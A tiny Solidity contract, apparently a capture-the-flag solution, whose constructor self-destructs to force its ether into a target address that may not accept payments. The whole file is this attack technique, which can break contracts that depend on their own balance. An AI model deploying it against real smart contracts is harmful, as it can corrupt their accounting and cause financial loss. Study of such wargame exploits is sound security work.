// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract HackForce {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}
